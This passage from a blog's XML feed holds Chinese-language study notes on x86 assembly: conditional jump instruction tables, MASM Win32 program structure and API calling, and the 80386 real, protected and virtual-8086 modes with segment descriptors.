Test</span><br></pre></td></tr></table></figure><p>编译器会报错，也就是说，要用到的eax的值不再有效，所以挡在invoke中使用addr伪操作符时，注意在它的前面不能用eax，否则eax的值会被覆盖掉，当然eax在addr的后面的参数中用是可以的</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>汇编跳转指令汇总</title>
      <link href="/2020/02/27/%E2%95%97%CF%80%E2%96%92%CE%B1%E2%95%A0%C2%B0%E2%95%AB%C2%AC%E2%95%93%E2%95%95%E2%94%B4%CE%B5%E2%95%97%CF%80%E2%95%AB%E2%96%84/"/>
      <url>/2020/02/27/%E2%95%97%CF%80%E2%96%92%CE%B1%E2%95%A0%C2%B0%E2%95%AB%C2%AC%E2%95%93%E2%95%95%E2%94%B4%CE%B5%E2%95%97%CF%80%E2%95%AB%E2%96%84/</url>
      
        <content type="html"><![CDATA[<h2 id="无条件跳转"><a href="#无条件跳转" class="headerlink" title="无条件跳转"></a>无条件跳转</h2><table><thead><tr><th align="center">名称</th><th align="center">条件</th></tr></thead><tbody><tr><td align="center">JMP</td><td align="center">无条件跳转</td></tr></tbody></table><h2 id="根据CX、ECX寄存器的值跳转"><a href="#根据CX、ECX寄存器的值跳转" class="headerlink" title="根据CX、ECX寄存器的值跳转"></a>根据CX、ECX寄存器的值跳转</h2><table><thead><tr><th align="center">名称</th><th align="center">条件</th></tr></thead><tbody><tr><td align="center">JCXZ</td><td align="center">CX为0则跳转</td></tr><tr><td align="center">JECXZ</td><td align="center">ECX为0则跳转</td></tr></tbody></table><h2 id="根据标志位跳转的指令"><a href="#根据标志位跳转的指令" class="headerlink" title="根据标志位跳转的指令"></a>根据标志位跳转的指令</h2><h3 id="无符号数"><a href="#无符号数" class="headerlink" title="无符号数"></a>无符号数</h3><table><thead><tr><th align="center">名称</th><th align="center">条件</th></tr></thead><tbody><tr><td align="center">JA</td><td align="center">无符号大于则跳转</td></tr><tr><td align="center">JNA</td><td align="center">无符号不大于则跳转</td></tr><tr><td align="center">JAE</td><td align="center">无符号大于等于则跳转，同JNB</td></tr><tr><td align="center">JNAE</td><td align="center">无符号不大于等于则跳转，同JB</td></tr><tr><td align="center">JB</td><td align="center">无符号小于则跳转</td></tr><tr><td align="center">JNB</td><td align="center">无符号不小于则跳转</td></tr><tr><td align="center">JBE</td><td align="center">无符号小于等于则跳转，同JNA</td></tr><tr><td align="center">JNBE</td><td align="center">无符号不小于等于则跳转，同JA</td></tr></tbody></table><h3 id="有符号数"><a href="#有符号数" class="headerlink" title="有符号数"></a>有符号数</h3><table><thead><tr><th align="center">名称</th><th align="center">条件</th></tr></thead><tbody><tr><td align="center">JG</td><td align="center">有符号大于则跳转</td></tr><tr><td align="center">JNG</td><td align="center">有符号不大于则跳转</td></tr><tr><td align="center">JGE</td><td align="center">有符号大于等于则跳转，同JNL</td></tr><tr><td align="center">JNGE</td><td align="center">有符号不大于等于则跳转，同JL</td></tr><tr><td align="center">JL</td><td align="center">有符号小于则跳转</td></tr><tr><td align="center">JNL</td><td align="center">有符号不小于则跳转</td></tr><tr><td align="center">JLE</td><td align="center">有符号小于等于则跳转，同JNG</td></tr><tr><td align="center">JNLE</td><td align="center">有符号不小于等于则跳转，同JG</td></tr></tbody></table><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><table><thead><tr><th align="center">名称</th><th align="center">条件</th></tr></thead><tbody><tr><td align="center">JE</td><td align="center">等于则跳转，同JZ</td></tr><tr><td align="center">JNE</td><td align="center">不等于则跳转，同JNZ</td></tr><tr><td align="center">JZ</td><td align="center">为零则跳转</td></tr><tr><td align="center">JNZ</td><td align="center">不为零则跳转</td></tr><tr><td align="center">JS</td><td align="center">为负则跳转</td></tr><tr><td align="center">JNS</td><td align="center">不为负则跳转</td></tr><tr><td align="center">JC</td><td align="center">进位则跳转</td></tr><tr><td align="center">JNC</td><td align="center">不进位则跳转</td></tr><tr><td align="center">JO</td><td align="center">溢出则跳转</td></tr><tr><td align="center">JNO</td><td align="center">不溢出则跳转</td></tr><tr><td align="center">JP</td><td align="center">为偶则跳转</td></tr><tr><td align="center">JNP</td><td align="center">不为偶则跳转</td></tr><tr><td align="center">JPE</td><td align="center">奇偶位置位则跳转，同JP</td></tr><tr><td align="center">JPO</td><td align="center">奇偶位复位则跳转，同JNP</td></tr></tbody></table>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>80x86汇编笔记02</title>
      <link href="/2020/02/27/80x86%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F02/"/>
      <url>/2020/02/27/80x86%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F02/</url>
      
        <content type="html"><![CDATA[<h2 id="模式定义"><a href="#模式定义" class="headerlink" title="模式定义"></a>模式定义</h2><h3 id="指定使用的指令集"><a href="#指定使用的指令集" class="headerlink" title="指定使用的指令集"></a>指定使用的指令集</h3><p>.386语句是汇编语句的伪指令，类似的指令还有：.8086、.186、.286、.386/386p、.486/486p和.586/586p等，用于告诉编译器在本程序中使用的指令集</p><p>在DOS的汇编中默认使用的是8086指令集，Win32环境工作在80386及以上的处理器中，所以需要指定指令集</p><p>另外，后面带p的伪指令则表示程序中可以在使用特权指令，这一类特权指令必须在特权级0上运行</p><h3 id="model语句"><a href="#model语句" class="headerlink" title="model语句"></a>model语句</h3><p>.model语句在低版本的宏汇编中已经存在，用来定义程序工作的模式，它的使用方法是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.model 内存模式 [语言模式][其他模式]</span><br></pre></td></tr></table></figure><h4 id="内存模式"><a href="#内存模式" class="headerlink" title="内存模式"></a>内存模式</h4><table><thead><tr><th align="center">模式</th><th align="center">内存使用方式</th></tr></thead><tbody><tr><td align="center">tiny</td><td align="center">用来建立.com文件，所有的代码、数据和堆栈都在同一个64KB段内</td></tr><tr><td align="center">small</td><td align="center">建立代码和数据分别用一个64KB段的.exe文件</td></tr><tr><td align="center">medium</td><td align="center">代码段可以有多个64KB段，数据段只有个64KB段</td></tr><tr><td align="center">compact</td><td align="center">代码段只有一个64KB，数据段可以有多个64KB段</td></tr><tr><td align="center">large</td><td align="center">代码段和数据段都可以有多个64KB段</td></tr><tr><td align="center">huge</td><td align="center">同large，并且数据段中的一个数组也可以超过64KB</td></tr><tr><td align="center">flat</td><td align="center">WIn32程序使用的模式，代码和数据段使用同一个4GB段</td></tr></tbody></table><p>对于Win32程序来说，只有一种内存模式，即flat(平坦模式)，意思是内存是很平坦的从0延伸到4GB，再没有64KB段大小限制。因为4GB空间用32位的寄存器全部都能访问到，不必在头脑中随时记着当前使用的是哪个数据段。</p><p>如果定义了<code>.model flat</code>，MASM自动为各种段寄存器做了如下定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ASSUME cs:FLAT,ds:FLAT,ss:FLAT,es:FLAT,fs:ERROR,gs:ERROR</span><br></pre></td></tr></table></figure><p>也就是说，CS、DS、SS和ES段全部使用平坦模式。FS和GS寄存器默认不使用，但如果要使用需要声明：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assume fs:nothing,gs:nothing ；或者</span><br><span class="line">assume fs:FLAT,gs:FLAT</span><br></pre></td></tr></table></figure><h4 id="语言模式"><a href="#语言模式" class="headerlink" title="语言模式"></a>语言模式</h4><p>在Win32汇编中，model语句还指定语言模式，即子程序和调用方式。一般使用的是stdcall，它指出了调用子程序或Win32 API时参数传递的次序和堆栈平衡的方法</p><p>还有C，SysCall，BASIC，FORTAN和PASCALL</p><p>因为Windows的API调用使用的是stdcall格式，所以在Win32汇编中没有选择，必须在.model中加上stdcall参数</p><h5 id="stdcall调用"><a href="#stdcall调用" class="headerlink" title="_stdcall调用"></a>_stdcall调用</h5><p>一般是Pascal程序的缺省调用方式。参数采用从右到左的压栈方式，被调函数自身在返回前清空堆栈</p><h5 id="cdecl调用"><a href="#cdecl调用" class="headerlink" title="_cdecl调用"></a>_cdecl调用</h5><p>一般是C/C++程序的缺省调用方式。参数采用从右到左的压栈方式，传送参数的内存栈由调用者维护。cdecl约定的函数只能被C/C++调用，每一个调用它的函数都包含清空堆栈的代码，所以产生的可执行文件大小会比调用stdcall函数的大</p><h3 id="option语句"><a href="#option语句" class="headerlink" title="option语句"></a>option语句</h3><p>如<code>option casemap:none</code>的意义是告诉编译器程序中的变量名和子程序名是否对大小写敏感。由于Win32 API的API函数名称本质是区分大小写的，所以必须指定这个选项，否则调用API函数就会出现问题</p><h2 id="段的定义"><a href="#段的定义" class="headerlink" title="段的定义"></a>段的定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line">&lt;一些include语句&gt;</span><br><span class="line">.stack [堆栈段的大小]</span><br><span class="line">.data</span><br><span class="line">&lt;一些初始化过的变量定义&gt;</span><br><span class="line">.data?</span><br><span class="line">&lt;一些没有初始化过的变量定义&gt;</span><br><span class="line">.const</span><br><span class="line">&lt;一些常量定义&gt;</span><br><span class="line">.code</span><br><span class="line">&lt;代码&gt;</span><br><span class="line">&lt;开始标号&gt;</span><br><span class="line">&lt;其他语句&gt;</span><br><span class="line">end 开始标号</span><br></pre></td></tr></table></figure><p>stack、data、data？、const和code都是分段伪指令，Win32中实际上只有代码和数据之分</p><p>data、data？和const这些都是指向数据段，code是指向代码段</p><p>和DOS汇编不同，Win32汇编不必考虑堆栈，系统会为程序分配一个向下的拓展的、足够大的段作为堆栈段，所以stack段定义常常被忽略</p><h2 id="Win32和DOS的不同"><a href="#Win32和DOS的不同" class="headerlink" title="Win32和DOS的不同"></a>Win32和DOS的不同</h2><p>所以Win32中段，实际上并不是DOS汇编中那种意义的段，而是内存的“分段”。上一个段的结束就是下一个段的开始，所有的分段，合起来，包括系统使用的地址空间，就组成了整个可以寻址的4GB空间</p><p>Win32汇编的内存管理使用了80386处理器的分页机制，每个页(4KB大小)可以自由指定属性，所以上一个4KB可能是代码，属性是可执行但不可写，下一个4KB就有可能是既可读也可写但不可执行的数据</p><p>Win32汇编程序中“分段”的概念实际上是把不同类型的数据或代码归类，再放到不同属性的内存页（也就是不同的“分段”）中，这中间不涉及使用不同的段选择器</p><h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>data、data？和const定义的是数据段，分别对应不同方式的数据定义，在最后生成的可执行文件中也分别放在不同的节区(Section)中</p><p>程序中的数据定义一段可以归纳为3类：</p><ul><li>可读可写的已定义变量<ul><li>这些数据在源程序中已经被定义了初始值，而且在程序的执行中有可能被更改</li><li>.data段是已初始化数据段，其中定义的数据是可读可写的，在程序装入完成的时候，这些值就已经在内存中，data段存放在可执行文件的_DATA节区内</li></ul></li><li>可读可写的未定义变量<ul><li>这些变量一般是当做缓冲区或者在程序执行后才开始使用的，这些数据可以定义在.data段中，也可以定义在.data?段中，但一般把它放到.data?段中</li><li>虽然定义在这两种段中都可以正常使用，但定义在.data?段中不会增大.exe文件的大小</li><li>举例说明，如果要用到一个100KB的缓冲区，可以在数据段中定义<ul><li><code>szBuffer    db    100*1024 dup(?)</code></li><li>如果放在.data段中，编译器认为这些数据在程序装入时必须有效，所以它在生成可执行文件的时候保留了所有的100KB内容</li><li>如果放在.data?段中，其中的内容编译器会认为程序在开始执行后才会用到，所以它在生成可执行文件的时候只保留了大小信息，不会浪费磁盘空间</li></ul></li></ul></li><li>常量<ul><li>这些数据放在.const段中，它是可读不可写的</li><li>一般为了方便起见，在小程序中常常把常量一起定义到data段中，而不另外定义一个const段</li><li>如果想要写入const段中的数据，会引起保护错误</li></ul></li></ul><h2 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h2><p>code段是代码段，所有的指令都必须写在代码段中，在可执行文件中，代码段是放在_TEXT节区中的。Win32环境中的数据段是不可执行的，只有代码段有可执行的属性。对于工作在特权级3的应用程序来说，code段是不可写的</p><p>在Windows95下，在特权级0下运行的程序对所有的段都有读写的权利，包括代码段。另外，在优先级3下与运行的程序也不是一定不能写代码段，代码段的属性是由可执行文件PE头部中的属性位决定的。通过编辑磁盘上的exe文件，把代码段属性位改成可写，那么在程序中就允许修改自己的代码段</p><blockquote><p>一些典型的应用就是一些针对可执行文件的压缩软件和加壳软件，如UPX和PeCompact等</p><p>这些软件靠把代码段进行变换来达到解压缩和解密的目的，被处理过的可执行文件在执行时需要由解压代码来将代码段解压缩，这就需要写代码段，所以这些软件对可执行文件代码段的属性预先做修改</p></blockquote><h2 id="程序结束和程序入口"><a href="#程序结束和程序入口" class="headerlink" title="程序结束和程序入口"></a>程序结束和程序入口</h2><p>在汇编程序中，并没有一个main函数，程序员可以指定从代码段的任何一个地方开始执行，这个地方由程序最后一句的end语句来指定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">end [开始地址]</span><br></pre></td></tr></table></figure><p>这句语句同时表示源程序结束，所有的代码必须在end语句之前。但是，一个源程序不必非要指定入口标号，这时候可以把开始地址忽略不写，这种情况发生在编写多模块程序的单个模块的时候</p><p>当分开写多个程序模块时，每个模块的源程序中也可以包括data、data？、const和code段，只是其他模块最后的end语句必须不带开始地址</p><p>当最后多个模块链接在一起的时候，只能由一个主模块指定入口地址，在多个模块中指定入口地址或者没有一个模块指定了入口地址，链接程序都会报错</p><h2 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h2><p>当源程序的某一行过长，不利于阅读的时候，可以分行书写，分行的办法是在一行的最后用反斜杠(\)做换行符</p><h2 id="调用API函数"><a href="#调用API函数" class="headerlink" title="调用API函数"></a>调用API函数</h2><blockquote><h4 id="Win32程序是构筑在Win32-API基础上的。在Win32-API中，包括了大量的函数、结构和消息等，它不仅为应用程序所调用，也是Windows自身的一部分，Windows自身的运行也调用这些API函数"><a href="#Win32程序是构筑在Win32-API基础上的。在Win32-API中，包括了大量的函数、结构和消息等，它不仅为应用程序所调用，也是Windows自身的一部分，Windows自身的运行也调用这些API函数" class="headerlink" title="Win32程序是构筑在Win32 API基础上的。在Win32 API中，包括了大量的函数、结构和消息等，它不仅为应用程序所调用，也是Windows自身的一部分，Windows自身的运行也调用这些API函数"></a>Win32程序是构筑在Win32 API基础上的。在Win32 API中，包括了大量的函数、结构和消息等，它不仅为应用程序所调用，也是Windows自身的一部分，Windows自身的运行也调用这些API函数</h4></blockquote><p>程序调用系统功能的一般过程：首先，系统提供功能模块并约定参数的定义方法，同时约定调用的方式，同时约定调用的方式，应用程序按照这个约定来调用系统功能</p><p>在DOS常用系统中断来实现调用。与DOS中断相比，Win32的系统功能模块放在Windows的动态链接库(DLL中)</p><blockquote><p>DLL是一种Windows的可执行文件，采用的是和我们熟悉的exe文件同样的PE约定格式，装着各种系统的API函数。实际上，Win32的基础就是由DLL组成的。Win32 API的核心由3个DLL提供，它们是：</p><ul><li>KERNEL32.DLL：系统服务功能，包括内存管理、任务管理和动态链接等</li><li>GDI32.DLL：图形设备接口，处理图形绘制</li><li>USER32.DLL：用户接口服务，建立窗口和传送消息</li></ul><p>还有其他的不同DLL，例如使用TCP/IP协议进行网络通信的DLL是Wsock32.dll，它所提供的API称为Socker API；专用于电话服务方面的API称为TAPI（Telephony API），包含在Tapi32.dll中</p></blockquote><h2 id="API函数的参数"><a href="#API函数的参数" class="headerlink" title="API函数的参数"></a>API函数的参数</h2><p>DOS下通过中断来调用系统“函数”，其中的“参数”是通过放在寄存器中</p><p>Win32 API是用堆栈来传递参数的，调用者把参数一个个压入堆栈，DLL中的函数程序再从堆栈中取出参数处理，并在返回之前将堆栈中已经无用的参数丢弃。在《Microsoft Win32 Programmer’s Reference》中定义了常用API的参数和函数声明</p><p>Win32环境中的参数实际上只有一种类型，那就是一个32位的整数，实际上就是汇编中的dword（double word、dd、双字型、4个字节、两个字、32位）</p><p>Windows所有编程资料发布的格式也是C格式</p><p>例子，在汇编中调用MessageBox函数的方法是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push uType</span><br><span class="line">push lpCaption</span><br><span class="line">push lpText</span><br><span class="line">push hWnd</span><br><span class="line">call MessageBox</span><br></pre></td></tr></table></figure><p>在源程序编译链接成可执行文件后，call MessageBox语句中的MessageBox会被换成一个地址，指向可执行文件中的导入表的一个索引（函数名或索引号）</p><p>导入表中指向MessageBox函数的实际地址会在程序装入内存的时候，根据User32.dll在内存中的位置由系统动态填入</p><h2 id="使用invoke语句"><a href="#使用invoke语句" class="headerlink" title="使用invoke语句"></a>使用invoke语句</h2><p>API是可以调用了，另一个麻烦的问题是Win32的API动辄就是十几个参数，整个源程序一眼看上去基本上都是把参数压堆栈的push指令，参数的个数和顺序很容易搞错，源程序可读性差</p><p>微软在MASM中提供了一个伪指令实现了一句中打入所有的参数，并在参数使用错误的时候能够提示，那就是invoke伪指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke 函数名 [参数1][参数2]...[参数n]</span><br></pre></td></tr></table></figure><p>例如调用MessageBox函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke MessageBox,NULL,offsetszText,offset szCaption,MB_OK</span><br></pre></td></tr></table></figure><blockquote><p>invoke并不是80386处理器的指令，而是一个MASM编译器的伪指令，在编译的时候它把上面的指令展开成我们需要的4个push指令和一个call指令，同时进行参数数量的检查工作</p></blockquote><p>对于不带参数的API调用，invoke伪指令的参数检查功能可有可无，既可以用call也可以用invoke</p><h2 id="API函数的返回值"><a href="#API函数的返回值" class="headerlink" title="API函数的返回值"></a>API函数的返回值</h2><p>返回值的类型对于汇编程序来说也只有dword一种类型，它永远放在eax中</p><p>如果要返回的内容不是一个eax所能容纳的，Win32 API采用的方式一般是返回一个指针，或者在调用参数中提供一个缓冲区地址，干脆把数据直接返回到缓冲区中去</p><h2 id="函数的声明"><a href="#函数的声明" class="headerlink" title="函数的声明"></a>函数的声明</h2><p>在调用API函数的时候，函数原型也必须预先声明，声明函数的格式是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名proto[距离][语言][参数1]:数据类型,[参数2]:数据类型</span><br></pre></td></tr></table></figure><p><code>proto</code>是函数声明的伪指令，距离可以是NEAR、FAR、NEAR16、NEAR32、FAR16或FAR32，Win32中只有一个平坦的段，无所谓距离，所以在定义的时候忽略的</p><p>对于Win32汇编来说只存在dword类型的参数，所以所有的参数类型永远都是dword，另外对于参数的名称其实是无用的，仅为了可读性，所以下面两句消息框函数的定义是一致的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageBox Proto hWnd:dword,lpText:dword,lpCation:dword,uType:dword</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MessageBoxProto :dword,:dword,:dword,:doword</span><br></pre></td></tr></table></figure><p>在Win32环境中，和字符串相关的API共有两类，分别对应两个字符集：一类是处理ANSI字符集(1B)的，另一类是处理Unicode字符集(2B)的。前一类函数名字的尾部带一个A字符，另一种则带一个W字符</p><h2 id="include语句"><a href="#include语句" class="headerlink" title="include语句"></a>include语句</h2><p>在MASM32工具包中已经包括了所有DLL的API函数声明列表，每个DLL对应.inc文件，在源程序中只要使用include包含进来就可以了，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include user32.inc</span><br><span class="line">include kernel32,inc</span><br></pre></td></tr></table></figure><h2 id="includelib语句"><a href="#includelib语句" class="headerlink" title="includelib语句"></a>includelib语句</h2><p>一个DLL文件对应一个导入库，如User32.dll文件用于编程的导入库是User32.lib，MASM32工具包中包含了所有DLL的导入库</p><p>和inlcude语句的处理不同，includelib不会吧.lib文件插入到源程序中，它只是告诉连接器在链接的时候到指定的库文件中去找而已。DLL文件中的函数没有包括声明，所以才需要将.inc文件插进去</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>80x86汇编笔记01</title>
      <link href="/2020/02/25/80x86%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F01/"/>
      <url>/2020/02/25/80x86%E2%95%97%CF%80%E2%96%92%CE%B1%E2%96%92%E2%95%A9%E2%95%9D%E2%95%9F01/</url>
      
        <content type="html"><![CDATA[<h2 id="80x86处理器的工作模式"><a href="#80x86处理器的工作模式" class="headerlink" title="80x86处理器的工作模式"></a>80x86处理器的工作模式</h2><p>80386以后的处理器有3种工作模式：实模式、保护模式和虚拟8086模式</p><p>其实，实模式和虚拟8086模式是为了向下兼容而设置的。而保护模式现代操作系统实际上的工作模式。只有在保护模式下，32位CPU的寻址才能达到4GB的地址空间，同时，也能实现多任务、内存分页管理和优先级保护等先进的机制</p><h2 id="实模式"><a href="#实模式" class="headerlink" title="实模式"></a>实模式</h2><p>处理器被复位或者加电的时候以实模式启动，这时候处理器中各寄存器以实模式的初始化值工作。80386处理器在实模式下的寄存器寻址方式和8086是一样的，由段寄存器的内容乘以16当做基地址，加上段内的偏移地址形成最终的物理地址，这时候它的32位地址只使用了低20位</p><p>在实模式下，80386处理器不能对内存进行分页管理，所以指令寻址的地址就是内存中实际的物理地址。在实模式下，所有的段都是可以读、写和执行的</p><p>实模式下80386不支持优先级，所有的指令相当于工作在特权级(优先级0)，所以它可以执行所有特权指令，包括读写控制寄存器CR0等</p><p>实际上，80386就是通过在实模式下初始化控制寄存器，GDTR、LDTR、IDTR与TR等管理寄存器以及页表，然后通过加载CR0使其中的保护模式使能位置位而进入保护模式的。当然，实模式下不支持硬件上的多任务切换</p><p>实模式下的中断处理方式和8086处理器相同，也用中断向量表来定位中断服务程序地址</p><p>中断向量表的结构也和8086处理器一样。每4个字节组成一个中断向量，其中包括两个字节的段地址和两个字节的偏移地址</p><p>80386实模式的最大的好处是可以使用80386的32位寄存器，还增加了两个辅助段寄存器FS和GS，使程序更加简洁，加快了执行速度。</p><h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><p>当80386工作在保护模式的时候，所有功能均可用。所有的32根地址线都可提供寻址，物理寻址空间高达4GB</p><p>在保护模式下，支持内存分页机制，提供了对虚拟内存的良好支持。虽然与8086可寻址的1MB物理地址空间相比，80386可寻址的物理地址空间非常大，但实际的微机系统不可能安装如此大的物理内存。所以，为了运行大型程序和真正实现多任务，虚拟内存是一种必需的技术</p><p>保护模式下80386支持多任务，可以依靠硬件仅在一条指令中实现任务切换。任务环境的保护工作是由处理器自动完成的</p><p>在保护模式下，80386处理器还支持优先级机制，不同的程序可以运行在不同的优先级上</p><p>优先级一共分0~3共4个级别，操作系统运行在最高的优先级0上，应用程序则运行在比较低的级别上</p><p>配合良好的检查及之后，既可以在任务间实现数据的安全共享也可以很好地隔离各个任务。从实模式切换到保护模式是通过修改控制寄存器CR0的控制位PE(位0)来实现的。在这之前还需要建立保护模式必需的一些数据表，如全局描述符表GDT和中断描述符表IDT等</p><p>DOS操作系统运行于实模式下，而WIndows操作系统运行于保护模式下</p><h2 id="虚拟8086模式"><a href="#虚拟8086模式" class="headerlink" title="虚拟8086模式"></a>虚拟8086模式</h2><p>虚拟8086模式是以任务形式在保护模式上执行的，在80386上可以同时支持由多个真正的80386任务和虚拟8086模式构成的任务</p><p>在虚拟8086模式下，80386支持任务切换和内存分页。在Windows操作系统中，有一部分程序专门用来管理虚拟8086模式的任务，称为虚拟8086管理程序</p><p>为了和8086程序的寻址方式兼容，虚拟8086模式采用和9096一样的寻址方式，即用段寄存器乘以16当做基址再配合偏移地址形成线性地址，寻址空间为1MB</p><p>但显然多个虚拟8086任务不能同时使用同一位置的1MB地址空间，否则会引起冲突。操作系统利用分页机制将不同虚拟8086任务的地址空间映射到不同的物理地址上去，这样每个8086任务看起来都认为自己在使用0~1MB的地址空间</p><p>8086代码中有相当一部分指令在保护模式下属于特权指令，如屏蔽中断的cli和中断返回指令iret等。这些指令在8086程序中是合法的。如果不让这些指令执行，8086代码就无法工作。虚拟8086管理程序采用模拟的方法来完成这些指令</p><p>虚拟8086管理程序在异常处理程序中检查产生异常的指令，如果是中断指令，则从虚拟8086任务的中断向量表中取出中断处理程序的入口地址，并将控制转移过去。如果是危及操作系统的指令，如cli等，则简单地忽略这些指令，在异常处理程序返回的时候直接返回到下一条指令</p><p>通过这些措施，8086程序既可以正常地运行下去，在执行这些指令的时候又察觉不到已经被虚拟8086管理程序做了手脚。</p><h2 id="DOS操作系统的内存安排"><a href="#DOS操作系统的内存安排" class="headerlink" title="DOS操作系统的内存安排"></a>DOS操作系统的内存安排</h2><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/8086%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/QQ%E5%9B%BE%E7%89%8720200221093341.png" alt></p><p>8086处理器的寻址范围只有1MB，系统硬件使用的存储器地址安排在高地址内存</p><p>地址是从A0000h（即640KB）开始的384KB中，其中有用于显示的视频缓冲区和BIOS的地址空间</p><p>而在低地址内存，安排了中断向量表和BIOS数据区；剩下从500h开始到A0000h总共不到640KB的内存是操作系统和应用程序所能够使用的；应用程序不可能使用这640KB以外的内存。而即使在这640KB中，DOS操作系统又占领了低端的一部分内存，最后剩下600KB左右的内存才是应用程序真正可以用的</p><p>如果系统中有内存驻留程序存在，那么应用程序还要和这些TSR(Terminate and Stay Resident 内存驻留程序)程序共同分享这段内存空间</p><h2 id="80386的内存寻址机制"><a href="#80386的内存寻址机制" class="headerlink" title="80386的内存寻址机制"></a>80386的内存寻址机制</h2><h4 id="实模式-1"><a href="#实模式-1" class="headerlink" title="实模式"></a>实模式</h4><p>实模式下，一个完成的地址由段地址和偏移地址两部分组成。处理器换算时先将段地址乘以10h，得到段在物理内存中的起始地址，然后加上16位的偏移地址得到实际的物理地址</p><h4 id="保护模式和虚拟8086模式"><a href="#保护模式和虚拟8086模式" class="headerlink" title="保护模式和虚拟8086模式"></a>保护模式和虚拟8086模式</h4><p>当80386处理器工作在保护模式和虚拟8086模式的时候，可以使用全部32根地址线访问4GB大的内存。段地址加偏移地址的计算方法显然无法覆盖这么大的范围</p><p>但计算机一下就可以发现，实际上和8086同样的限制已经不复存在，因为80386所有的通用寄存器都是32位的，2的32次方就是4G，所以用任何一个通用寄存器来间接寻址，不必分段就已经可以访问到所有的内存地址</p><p>虽然在寻址上不再有分段的限制问题，但在保护模式下，一个地址空间是否可以被写入，可以被多少优先级的代码写入，就涉及保护的问题了。解决这些问题，必须对一个地址空间定义一些安全上的属性，可否就将这些属性存放在段寄存器中？</p><p>问题来了，涉及属性和保护模式下段的其他参数，要表示的信息太多了，要用64位长的数据才能表示。我们把这64位的属性数据叫做段描述符(Segment Descriptor)</p><p>80386的段寄存器依然是16位的，无法放下保护模式下64位的段描述符。需要把所有段的描述符按顺序放在内存中的指定位置，组成一个段描述符表(Descriptor Table)</p><p>而段寄存器中的16位用来做索引信息，指定这个段的属性用段描述符表中的第几个描述符来表示</p><p>这时段寄存器中的信息不再是段地址了，而是段选择器(Segment Selector)。可以通过它在段描述符表中选择一个项目以得到段的全部信息</p><p>80386中引入了两个全新的寄存器来管理段描述符表。一个是48位的全局描述符表寄存器GDTR，一个是16位的局部描述符表寄存器LDTR</p><p>实际上16位的段选择器中只有高13位表示索引值。剩下的3个数据位中，第0、1位表示程序的当前优先级RPL；第2位TI位用来表示在段描述符的位置；TI=0表示在GDT中，TI=1表示在LDT中</p><ul><li>在保护模式下，同样以xxxx:yyyyyyyy格式表示一个虚拟地址</li><li>注意，xxxx(16位，相当于8086时代的段地址)保存在段寄存器，yyyyyyyy（32位，相当于8086时代的偏移地址）保存在通用寄存器</li></ul><p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/8086%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/QQ%E5%9B%BE%E7%89%8720200221104243.png" alt></p><h4 id="GDTR"><a href="#GDTR" class="headerlink" title="GDTR"></a>GDTR</h4><p>GDTR指向的描述符表为全局描述符表GDT(Global Descriptor Table)，它包含系统中所有任务都可用的段描述符，它包含系统中所有任务都可用的段描述符，通常包含描述符操作系统所使用的代码段、数据段和堆栈段的描述符及各任务的LDT段等；全局描述符表只有一个</p><h4 id="LDTR"><a href="#LDTR" class="headerlink" title="LDTR"></a>LDTR</h4><p>LDTR则指向局部描述符表LDT(Local Descriptor 